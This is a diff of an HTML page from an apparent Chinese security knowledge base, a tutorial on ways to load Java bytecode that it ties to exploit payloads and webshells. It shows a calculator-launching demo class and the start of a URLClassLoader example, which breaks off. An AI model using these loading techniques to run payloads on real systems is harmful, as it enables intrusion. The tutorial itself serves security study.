@@ -4,7 +4,7 @@
     <head>
         <meta charset="UTF-8">
         <meta content="text/html; charset=utf-8" http-equiv="Content-Type">
-        <title>07.Java加载字节码 · d4m1ts's知识库</title>
+        <title>07.Java加载字节码 · d4m1ts 知识库</title>
         <meta http-equiv="X-UA-Compatible" content="IE=edge" />
         <meta name="description" content="">
         <meta name="generator" content="GitBook 3.2.3">
@@ -21,11 +21,7 @@
                 
             
                 
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-highlight/website.css">
-                
-            
-                
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-chapter-fold/chapter-fold.css">
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-expandable-chapters-small/expandable-chapters-small.css">
                 
             
                 
@@ -46,10 +42,6 @@
             
                 
                 <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-donate/plugin.css">
-                
-            
-                
-                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-back-to-top-button/plugin.css">
                 
             
                 
@@ -77,6 +69,14 @@
                 
             
                 
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-flexible-alerts/style.css">
+                
+            
+                
+                <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-prism/prism-tomorrow.css">
+                
+            
+                
                 <link rel="stylesheet" href="../../../../gitbook/gitbook-plugin-fontsettings/website.css">
                 
             
@@ -101,6 +101,7 @@
         
     
     
+    
     <meta name="HandheldFriendly" content="true"/>
     <meta name="viewport" content="width=device-width, initial-scale=1, user-scalable=no">
     <meta name="apple-mobile-web-app-capable" content="yes">
@@ -113,6 +114,23 @@
     
     
     <link rel="prev" href="06.IDEA断点调试.html" />
+    
+
+    
+        <link rel="shortcut icon" href='../../../../README.assets/favicon.ico' type="image/x-icon">
+    
+    
+        <link rel="bookmark" href='../../../../README.assets/favicon.ico' type="image/x-icon">
+    
+    
+        <link rel="apple-touch-icon" href='../../../../README.assets/favicon.ico'>
+    
+    
+        
+        <link rel="apple-touch-icon" sizes="120x120" href="../../../../README.assets/favicon.ico">
+        
+        <link rel="apple-touch-icon" sizes="180x180" href="../../../../README.assets/favicon.ico">
+        
     
 
     </head>
@@ -786,6 +804,38 @@
             
         </li>
     
+        <li class="chapter " data-level="1.5.2" >
+            
+                <span>
+            
+                    
+                    02.GIT
+            
+                </span>
+            
+
+            
+            <ul class="articles">
+                
+    
+        <li class="chapter " data-level="1.5.2.1" data-path="../../../04.暂未分类/02.GIT/1.gitbook.html">
+            
+                <a href="../../../04.暂未分类/02.GIT/1.gitbook.html">
+            
+                    
+                    1.gitbook
+            
+                </a>
+            
+
+            
+        </li>
+    
+
+            </ul>
+            
+        </li>
+    
 
             </ul>
             
@@ -862,7 +912,7 @@
     
                                 <section class="normal markdown-section">
                                 
-                                <html><head></head><body><div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#&#x7B80;&#x4ECB;"><b>1. </b>&#x7B80;&#x4ECB;</a></li><ul><li><span class="title-icon "></span><a href="#&#x4EC0;&#x4E48;&#x662F;java&#x5B57;&#x8282;&#x7801;"><b>1.1. </b>&#x4EC0;&#x4E48;&#x662F;Java&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#java&#x7A0B;&#x5E8F;&#x7684;&#x8FD0;&#x884C;"><b>1.2. </b>JAVA&#x7A0B;&#x5E8F;&#x7684;&#x8FD0;&#x884C;</a></li><li><span class="title-icon "></span><a href="#&#x5B57;&#x8282;&#x7801;&#x5982;&#x4F55;&#x4EA7;&#x751F;"><b>1.3. </b>&#x5B57;&#x8282;&#x7801;&#x5982;&#x4F55;&#x4EA7;&#x751F;</a></li><li><span class="title-icon "></span><a href="#&#x5982;&#x4F55;&#x770B;&#x61C2;&#x5B57;&#x8282;&#x7801;"><b>1.4. </b>&#x5982;&#x4F55;&#x770B;&#x61C2;&#x5B57;&#x8282;&#x7801;</a></li></ul><li><span class="title-icon "></span><a href="#&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b>2. </b>&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><ul><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;urlclassloader&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;class&#x6587;&#x4EF6;"><b>2.1. </b>&#x5229;&#x7528;URLClassLoader&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;class&#x6587;&#x4EF6;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;classloaderdefineclass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b>2.2. </b>&#x5229;&#x7528;ClassLoader#defineClass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;templatesimpl&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b>2.3. </b>&#x5229;&#x7528;TemplatesImpl&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;unsafedefineclass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b>2.4. </b>&#x5229;&#x7528;Unsafe#defineClass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;bcel-classloader&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b>2.5. </b>&#x5229;&#x7528;BCEL ClassLoader&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li></ul><li><span class="title-icon "></span><a href="#&#x53C2;&#x8003;"><b>3. </b>&#x53C2;&#x8003;</a></li></ul></div><a href="#&#x7B80;&#x4ECB;" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><div id="anchor-navigation-ex-navbar"><i class="fa fa-anchor"></i><ul><li><span class="title-icon "></span><a href="#&#x7B80;&#x4ECB;"><b></b>&#x7B80;&#x4ECB;</a></li><ul><li><span class="title-icon "></span><a href="#&#x4EC0;&#x4E48;&#x662F;java&#x5B57;&#x8282;&#x7801;"><b></b>&#x4EC0;&#x4E48;&#x662F;Java&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#java&#x7A0B;&#x5E8F;&#x7684;&#x8FD0;&#x884C;"><b></b>JAVA&#x7A0B;&#x5E8F;&#x7684;&#x8FD0;&#x884C;</a></li><li><span class="title-icon "></span><a href="#&#x5B57;&#x8282;&#x7801;&#x5982;&#x4F55;&#x4EA7;&#x751F;"><b></b>&#x5B57;&#x8282;&#x7801;&#x5982;&#x4F55;&#x4EA7;&#x751F;</a></li><li><span class="title-icon "></span><a href="#&#x5982;&#x4F55;&#x770B;&#x61C2;&#x5B57;&#x8282;&#x7801;"><b></b>&#x5982;&#x4F55;&#x770B;&#x61C2;&#x5B57;&#x8282;&#x7801;</a></li></ul><li><span class="title-icon "></span><a href="#&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b></b>&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><ul><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;urlclassloader&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;class&#x6587;&#x4EF6;"><b></b>&#x5229;&#x7528;URLClassLoader&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;class&#x6587;&#x4EF6;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;classloaderdefineclass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b></b>&#x5229;&#x7528;ClassLoader#defineClass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;templatesimpl&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b></b>&#x5229;&#x7528;TemplatesImpl&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;unsafedefineclass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b></b>&#x5229;&#x7528;Unsafe#defineClass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;bcel-classloader&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b></b>&#x5229;&#x7528;BCEL ClassLoader&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li></ul><li><span class="title-icon "></span><a href="#&#x53C2;&#x8003;"><b></b>&#x53C2;&#x8003;</a></li></ul></div><a href="#&#x7B80;&#x4ECB;" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><div class="treeview__container"><div class="treeview__container-title"><span class="treeview__main-title">Treeview</span><span class="treeview__copyright">Copyright &#xA9; d4m1ts all right reserved, powered by <a href="https://github.com/aleen42" target="_blank">aleen42</a></span></div><ul>
+                                <html><head></head><body><div id="anchor-navigation-ex-navbar"><i class="fa fa-navicon"></i><ul><li><span class="title-icon "></span><a href="#&#x7B80;&#x4ECB;"><b>1. </b>&#x7B80;&#x4ECB;</a></li><ul><li><span class="title-icon "></span><a href="#&#x4EC0;&#x4E48;&#x662F;java&#x5B57;&#x8282;&#x7801;"><b>1.1. </b>&#x4EC0;&#x4E48;&#x662F;Java&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#java&#x7A0B;&#x5E8F;&#x7684;&#x8FD0;&#x884C;"><b>1.2. </b>JAVA&#x7A0B;&#x5E8F;&#x7684;&#x8FD0;&#x884C;</a></li><li><span class="title-icon "></span><a href="#&#x5B57;&#x8282;&#x7801;&#x5982;&#x4F55;&#x4EA7;&#x751F;"><b>1.3. </b>&#x5B57;&#x8282;&#x7801;&#x5982;&#x4F55;&#x4EA7;&#x751F;</a></li><li><span class="title-icon "></span><a href="#&#x5982;&#x4F55;&#x770B;&#x61C2;&#x5B57;&#x8282;&#x7801;"><b>1.4. </b>&#x5982;&#x4F55;&#x770B;&#x61C2;&#x5B57;&#x8282;&#x7801;</a></li></ul><li><span class="title-icon "></span><a href="#&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b>2. </b>&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><ul><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;urlclassloader&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;class&#x6587;&#x4EF6;"><b>2.1. </b>&#x5229;&#x7528;URLClassLoader&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;class&#x6587;&#x4EF6;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;classloaderdefineclass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b>2.2. </b>&#x5229;&#x7528;ClassLoader#defineClass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;templatesimpl&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b>2.3. </b>&#x5229;&#x7528;TemplatesImpl&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;unsafedefineclass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b>2.4. </b>&#x5229;&#x7528;Unsafe#defineClass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;bcel-classloader&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b>2.5. </b>&#x5229;&#x7528;BCEL ClassLoader&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li></ul><li><span class="title-icon "></span><a href="#&#x53C2;&#x8003;"><b>3. </b>&#x53C2;&#x8003;</a></li></ul></div><a href="#&#x7B80;&#x4ECB;" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><div id="anchor-navigation-ex-navbar"><i class="fa fa-anchor"></i><ul><li><span class="title-icon "></span><a href="#&#x7B80;&#x4ECB;"><b></b>&#x7B80;&#x4ECB;</a></li><ul><li><span class="title-icon "></span><a href="#&#x4EC0;&#x4E48;&#x662F;java&#x5B57;&#x8282;&#x7801;"><b></b>&#x4EC0;&#x4E48;&#x662F;Java&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#java&#x7A0B;&#x5E8F;&#x7684;&#x8FD0;&#x884C;"><b></b>JAVA&#x7A0B;&#x5E8F;&#x7684;&#x8FD0;&#x884C;</a></li><li><span class="title-icon "></span><a href="#&#x5B57;&#x8282;&#x7801;&#x5982;&#x4F55;&#x4EA7;&#x751F;"><b></b>&#x5B57;&#x8282;&#x7801;&#x5982;&#x4F55;&#x4EA7;&#x751F;</a></li><li><span class="title-icon "></span><a href="#&#x5982;&#x4F55;&#x770B;&#x61C2;&#x5B57;&#x8282;&#x7801;"><b></b>&#x5982;&#x4F55;&#x770B;&#x61C2;&#x5B57;&#x8282;&#x7801;</a></li></ul><li><span class="title-icon "></span><a href="#&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b></b>&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><ul><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;urlclassloader&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;class&#x6587;&#x4EF6;"><b></b>&#x5229;&#x7528;URLClassLoader&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;class&#x6587;&#x4EF6;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;classloaderdefineclass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b></b>&#x5229;&#x7528;ClassLoader#defineClass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;templatesimpl&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b></b>&#x5229;&#x7528;TemplatesImpl&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;unsafedefineclass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b></b>&#x5229;&#x7528;Unsafe#defineClass&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li><li><span class="title-icon "></span><a href="#&#x5229;&#x7528;bcel-classloader&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><b></b>&#x5229;&#x7528;BCEL ClassLoader&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</a></li></ul><li><span class="title-icon "></span><a href="#&#x53C2;&#x8003;"><b></b>&#x53C2;&#x8003;</a></li></ul></div><a href="#&#x7B80;&#x4ECB;" id="anchorNavigationExGoTop"><i class="fa fa-arrow-up"></i></a><div class="treeview__container"><ul>
 <li><div><a href="#&#x7B80;&#x4ECB;">&#x7B80;&#x4ECB;</a><i class="level__parent level__item level__parent--opened" state="opened" onclick="var curState = this.getAttribute(&apos;state&apos;);var nextState = curState === &apos;opened&apos; ? &apos;hidden&apos; : &apos;opened&apos;;this.setAttribute(&apos;state&apos;, nextState);this.className = this.className.split(curState).join(nextState);var list = this.parentNode.nextElementSibling;if (nextState === &apos;hidden&apos;) {    list.style.display = &apos;none&apos;;} else {    list.style.display = &apos;block&apos;;}"></i></div>
 <ul>
 <li><div><a href="#&#x4EC0;&#x4E48;&#x662F;java&#x5B57;&#x8282;&#x7801;">&#x4EC0;&#x4E48;&#x662F;Java&#x5B57;&#x8282;&#x7801;</a><i></i></div></li>
@@ -882,7 +932,7 @@
 </ul>
 </div>
 
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/d4m1ts-2021-ff751a.svg" data-lightbox="41a7d8b7-9bfe-4b1a-b4c2-b77147a7bb1d" data-title=""><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/d4m1ts-2021-ff751a.svg" alt=""></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/d4m1ts-2021-ff751a.svg" data-lightbox="d02b4b4b-cf71-4d39-8580-90808b258313" data-title=""><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/d4m1ts-2021-ff751a.svg" alt=""></a></p>
 <h1 id="&#x7B80;&#x4ECB;"><a name="&#x7B80;&#x4ECB;" class="anchor-navigation-ex-anchor" href="#&#x7B80;&#x4ECB;"><i class="fa fa-link" aria-hidden="true"></i></a>1. &#x7B80;&#x4ECB;</h1>
 <h2 id="&#x4EC0;&#x4E48;&#x662F;java&#x5B57;&#x8282;&#x7801;"><a name="&#x4EC0;&#x4E48;&#x662F;java&#x5B57;&#x8282;&#x7801;" class="anchor-navigation-ex-anchor" href="#&#x4EC0;&#x4E48;&#x662F;java&#x5B57;&#x8282;&#x7801;"><i class="fa fa-link" aria-hidden="true"></i></a>1.1. &#x4EC0;&#x4E48;&#x662F;Java&#x5B57;&#x8282;&#x7801;</h2>
 <p>&#x5B83;&#x662F;&#x7A0B;&#x5E8F;&#x7684;&#x4E00;&#x79CD;&#x4F4E;&#x7EA7;&#x8868;&#x793A;&#xFF0C;&#x53EF;&#x4EE5;&#x8FD0;&#x884C;&#x4E8E;Java&#x865A;&#x62DF;&#x673A;&#x4E0A;&#x3002;&#x5C06;&#x7A0B;&#x5E8F;&#x62BD;&#x8C61;&#x6210;&#x5B57;&#x8282;&#x7801;&#x53EF;&#x4EE5;&#x4FDD;&#x8BC1;Java&#x7A0B;&#x5E8F;&#x5728;&#x5404;&#x79CD;&#x8BBE;&#x5907;&#x4E0A;&#x7684;&#x8FD0;&#x884C;</p>
@@ -892,7 +942,7 @@
 <p>JVM&#x4F4D;&#x4E8E;Java&#x7F16;&#x8BD1;&#x5668;&#x548C;OS&#x5E73;&#x53F0;&#x4E4B;&#x95F4;&#xFF0C;Java&#x7F16;&#x8BD1;&#x5668;&#x53EA;&#x9700;&#x9762;&#x5411;JVM&#xFF0C;&#x751F;&#x6210;JVM&#x80FD;&#x7406;&#x89E3;&#x7684;&#x4EE3;&#x7801;&#xFF0C;&#x8FD9;&#x4E2A;&#x4EE3;&#x7801;&#x5373;&#x5B57;&#x8282;&#x7801;&#xFF0C;JVM&#x518D;&#x5C06;&#x5B57;&#x8282;&#x7801;&#x7FFB;&#x8BD1;&#x6210;&#x771F;&#x5B9E;&#x673A;&#x5668;&#x6240;&#x80FD;&#x7406;&#x89E3;&#x7684;&#x4E8C;&#x8FDB;&#x5236;&#x673A;&#x5668;&#x7801;&#x3002;</p>
 <h2 id="&#x5B57;&#x8282;&#x7801;&#x5982;&#x4F55;&#x4EA7;&#x751F;"><a name="&#x5B57;&#x8282;&#x7801;&#x5982;&#x4F55;&#x4EA7;&#x751F;" class="anchor-navigation-ex-anchor" href="#&#x5B57;&#x8282;&#x7801;&#x5982;&#x4F55;&#x4EA7;&#x751F;"><i class="fa fa-link" aria-hidden="true"></i></a>1.3. &#x5B57;&#x8282;&#x7801;&#x5982;&#x4F55;&#x4EA7;&#x751F;</h2>
 <p>&#x6211;&#x4EEC;&#x7F16;&#x5199;&#x7684;&#x4EE3;&#x7801;&#x6587;&#x4EF6;&#x901A;&#x5E38;&#x662F;&#x4EE5;<code>.java</code>&#x4F5C;&#x4E3A;&#x7ED3;&#x5C3E;&#x7684;&#xFF0C;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x901A;&#x8FC7;<code>javac</code>&#x547D;&#x4EE4;&#x5C06;java&#x6587;&#x4EF6;&#x7F16;&#x8BD1;&#x4E3A;<code>.class</code>&#x6587;&#x4EF6;&#xFF0C;&#x8FD9;&#x4E2A;<code>.class</code>&#x6587;&#x4EF6;&#x5C31;&#x662F;&#x5B57;&#x8282;&#x7801;&#x6587;&#x4EF6;&#xFF0C;&#x4E5F;&#x53EF;&#x4EE5;&#x76F4;&#x63A5;&#x8FD0;&#x884C;IDE&#xFF0C;&#x8BA9;&#x5176;&#x81EA;&#x52A8;&#x4E3A;&#x6211;&#x4EEC;&#x7F16;&#x8BD1;</p>
-<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027130138624.png" data-lightbox="0b4fa023-ae13-4ee3-b896-4d5d05dae80e" data-title="image-20211027130138624"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027130138624.png" alt="image-20211027130138624"></a></p>
+<p><a href="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027130138624.png" data-lightbox="04652be9-9fe4-44d6-89f4-6b771aad32cf" data-title="image-20211027130138624"><img src="Java&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;.assets/image-20211027130138624.png" alt="image-20211027130138624"></a></p>
 <h2 id="&#x5982;&#x4F55;&#x770B;&#x61C2;&#x5B57;&#x8282;&#x7801;"><a name="&#x5982;&#x4F55;&#x770B;&#x61C2;&#x5B57;&#x8282;&#x7801;" class="anchor-navigation-ex-anchor" href="#&#x5982;&#x4F55;&#x770B;&#x61C2;&#x5B57;&#x8282;&#x7801;"><i class="fa fa-link" aria-hidden="true"></i></a>1.4. &#x5982;&#x4F55;&#x770B;&#x61C2;&#x5B57;&#x8282;&#x7801;</h2>
 <p>&#x53EF;&#x4EE5;&#x53C2;&#x8003;&#x6587;&#x7AE0;&#xFF1A;<a href="https://www.jianshu.com/p/fa53b4169df9" target="_blank">&#x6DF1;&#x5165;&#x7406;&#x89E3;JVM-&#x8BFB;&#x61C2;java&#x5B57;&#x8282;&#x7801;</a></p>
 <h1 id="&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><a name="&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;" class="anchor-navigation-ex-anchor" href="#&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;"><i class="fa fa-link" aria-hidden="true"></i></a>2. &#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;</h1>
@@ -900,68 +950,68 @@
 <ul>
 <li>&#x540E;&#x7EED;&#x5229;&#x7528;&#x5230;&#x7684;&#x6F14;&#x793A;&#x6076;&#x610F;&#x4EE3;&#x7801;&#x5982;&#x4E0B;</li>
 </ul>
-<pre><code class="lang-java"><span class="hljs-keyword">import</span> java.io.IOException;
+<pre class="language-"><code class="lang-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>io<span class="token punctuation">.</span></span><span class="token class-name">IOException</span><span class="token punctuation">;</span>
 
-<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Exp</span> </span>{
-    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-title">Exp</span><span class="hljs-params">()</span> <span class="hljs-keyword">throws</span> IOException </span>{
-        Runtime.getRuntime().exec(<span class="hljs-keyword">new</span> String[]{<span class="hljs-string">&quot;open&quot;</span>, <span class="hljs-string">&quot;-na&quot;</span>, <span class="hljs-string">&quot;Calculator&quot;</span>});
-    }
-}
+<span class="token keyword">public</span> <span class="token keyword">class</span> <span class="token class-name">Exp</span> <span class="token punctuation">{</span>
+    <span class="token keyword">public</span> <span class="token class-name">Exp</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token keyword">throws</span> <span class="token class-name">IOException</span> <span class="token punctuation">{</span>
+        <span class="token class-name">Runtime</span><span class="token punctuation">.</span><span class="token function">getRuntime</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">exec</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">String</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">{</span><span class="token string">&quot;open&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;-na&quot;</span><span class="token punctuation">,</span> <span class="token string">&quot;Calculator&quot;</span><span class="token punctuation">}</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
+    <span class="token punctuation">}</span>
+<span class="token punctuation">}</span>
 </code></pre>
 <ul>
 <li>&#x7F16;&#x8BD1;&#x4E3A;&#x5B57;&#x8282;&#x7801;</li>
 </ul>
-<pre><code>javac Exp.java
+<pre class="language-"><code>javac Exp.java
 </code></pre><h2 id="&#x5229;&#x7528;urlclassloader&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;class&#x6587;&#x4EF6;"><a name="&#x5229;&#x7528;urlclassloader&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;class&#x6587;&#x4EF6;" class="anchor-navigation-ex-anchor" href="#&#x5229;&#x7528;urlclassloader&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;class&#x6587;&#x4EF6;"><i class="fa fa-link" aria-hidden="true"></i></a>2.1. &#x5229;&#x7528;URLClassLoader&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;class&#x6587;&#x4EF6;</h2>
 <p>&#x5229;&#x7528;<code>ClassLoader</code>&#x6765;&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;&#x6587;&#x4EF6;&#x662F;&#x6700;&#x57FA;&#x7840;&#x7684;&#x65B9;&#x6CD5;&#xFF0C;<code>URLClassLoader</code>&#x7EE7;&#x627F;&#x81EA;<code>ClassLoader</code>&#x4E14;&#x91CD;&#x5199;&#x4E86;<code>findClass</code>&#x51FD;&#x6570;&#xFF0C;&#x5141;&#x8BB8;&#x8FDC;&#x7A0B;&#x52A0;&#x8F7D;&#x5B57;&#x8282;&#x7801;&#xFF0C;&#x5728;&#x5199;&#x6F0F;&#x6D1E;&#x5229;&#x7528;&#x7684;<code>payload</code>&#x6216;&#x8005;<code>webshell</code>&#x7684;&#x65F6;&#x5019;&#x6211;&#x4EEC;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x8FD9;&#x4E2A;&#x7279;&#x6027;&#x6765;&#x52A0;&#x8F7D;&#x8FDC;&#x7A0B;&#x7684;jar&#x6765;&#x5B9E;&#x73B0;&#x8FDC;&#x7A0B;&#x7684;&#x7C7B;&#x65B9;&#x6CD5;&#x8C03;&#x7528;&#xFF08;&#x5F53;&#x7136;&#xFF0C;&#x8BE5;&#x65B9;&#x5F0F;&#x53EA;&#x9002;&#x5E94;&#x4E8E;&#x76EE;&#x6807;&#x51FA;&#x7F51;&#x7684;&#x60C5;&#x51B5;&#xFF09;&#x3002;</p>
 <p>&#x6B63;&#x5E38;&#x60C5;&#x51B5;&#x4E0B;&#xFF0C;Java&#x4F1A;&#x6839;&#x636E;&#x914D;&#x7F6E;&#x9879; <code>sun.boot.class.path</code>&#x548C;<code>java.class.path</code>&#x4E2D;&#x5217;&#x4E3E;&#x5230;&#x7684;&#x57FA;&#x7840;&#x8DEF;&#x5F84;&#xFF08;&#x8FD9;&#x4E9B;&#x8DEF;&#x5F84;&#x662F;&#x7ECF;&#x8FC7;&#x5904;&#x7406;&#x540E;&#x7684;<code>java.net.URL</code>&#x7C7B;&#xFF09;&#x6765;&#x5BFB;&#x627E;.class&#x6587;&#x4EF6;&#x6765;&#x52A0;&#x8F7D;&#xFF0C;&#x800C;&#x8FD9;&#x4E2A;&#x57FA;&#x7840;&#x8DEF;&#x5F84;&#x6709;&#x5206;&#x4E3A;&#x4E09;&#x79CD;&#x60C5;&#x51B5;&#xFF1A;</p>
 <ol>
 <li><p>URL&#x672A;&#x4EE5;&#x659C;&#x6760;/&#x7ED3;&#x5C3E;&#xFF0C;&#x5219;&#x8BA4;&#x4E3A;&#x662F;&#x4E00;&#x4E2A;JAR&#x6587;&#x4EF6;&#xFF0C;&#x4F7F;&#x7528; <code>JarLoader</code> &#x6765;&#x5BFB;&#x627E;&#x7C7B;&#xFF0C;&#x5373;&#x4E3A;&#x5728;Jar&#x5305;&#x4E2D;&#x5BFB;&#x627E;<code>.class</code>&#x6587;&#x4EF6;&#xFF08;jar&#x6587;&#x4EF6;&#x4E2D;&#x76F4;&#x63A5;&#x5305;&#x542B;class&#x6587;&#x4EF6;&#xFF0C;&#x53EF;&#x4EE5;&#x4F7F;&#x7528;&#x547D;&#x4EE4; <code>jar cvf Exp.jar Exp.class</code> &#x8FDB;&#x884C;&#x6253;&#x5305;&#xFF09;&#x3002;</p>
-<pre><code class="lang-java"><span class="hljs-keyword">import</span> java.net.MalformedURLException;
-<span class="hljs-keyword">import</span> java.net.URL;
-<span class="hljs-keyword">import</span> java.net.URLClassLoader;
+<pre class="language-"><code class="lang-java"><span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">MalformedURLException</span><span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span>URL<span class="token punctuation">;</span>
+<span class="token keyword">import</span> <span class="token namespace">java<span class="token punctuation">.</span>net<span class="token punctuation">.</span></span><span class="token class-name">URLClassLoader</span><span class="token punctuation">;</span>
 
-<span class="hljs-keyword">public</span> <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">loadClassFile</span> </span>{
-    <span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> MalformedURLException, ClassNotFoundException, IllegalAccessException, InstantiationException </span>{
